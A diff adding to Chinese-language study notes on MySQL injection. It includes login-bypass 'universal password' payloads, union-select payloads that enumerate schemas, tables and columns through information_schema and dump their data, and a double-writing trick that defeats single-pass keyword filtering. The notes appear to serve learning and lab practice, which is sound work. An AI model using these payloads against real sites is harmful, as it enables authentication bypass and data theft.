@@ -829,9 +829,10 @@ xxxxxx
 
 **MySQL中的注释：**
 
-- `#`，直接加注释内容
+- `#`，直接加注释内容，有时需要注意可能被解析为页内跳转，所以使用`%23`
 - `--`，`--`注释符后需要加一个空格，注释才能生效
 - `/* */`，多行注释符
+- `-+`，注释变体
 
 **`php`连接`mysql`**
 
@@ -855,3 +856,63 @@ if ($row) {}
    1. `SELECT * FROM admin WHERE email='a@e.com' UNION SELECT * FROM admin WHERE 1 = 1-- AND pwd='$pwd'`
 3. 万能密码2型：`admin' = ''-- `即 False='' 恒成立
    1. **`SELECT * FROM admin WHERE email='a@e.com' = ''-- AND pwd='$pwd'`**
+
+#### SQL操作
+
+**验证查询返回列**
+
+- union select
+
+```mysql
+UNION SELECT 1, 2 # 报错: The used SELECT statements have a different number of columns
+UNION SELECT 1, 2, 3 # 一个一个试出原始查询语句返回列数, 成功则相应返回将填入相应index
+```
+
+- order by
+
+```sql
+order by 3 # 更改数字，表示以第几列进行排序
+```
+
+**基础信息**
+
+```sql
+version() # 数据库版本信息
+database() # 数据库
+```
+
+**爆破全部数据库**
+
+```sql
+union select 1,2,group_concat(schema_name) from information_schema.schemata%23
+```
+
+**查数据库中表**
+
+```sql
+# 在第三个回显中显示数据库表
+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
+# group_concat: 查询结果逗号连接成字符串
+# table_name: 是系统数据库information_schema.tables中一个字段
+# table_schema: 表所属数据库名称
+# database(): 当前连接的数据库名称
+```
+
+**对表查列字段**
+
+```sql
+union select 1,2,group_concat(column_name)from information_schema.columns where table_name='leak_table_name'
+```
+
+**对数据表爆数据**
+
+```sql
+union select 1,2,group_concat(leak_column_name) from data_base_table_name # 或 from data_base_name.dtable_name
+```
+
+**关键字绕过**
+
+将`or`, `select`, `union`, `where`, `and`, `from`进行屏蔽
+
+`str_replace`函数屏蔽将目标字符串只过滤一次，可以通过双写绕过：`uunionnion, sselectelect, oorr`
+
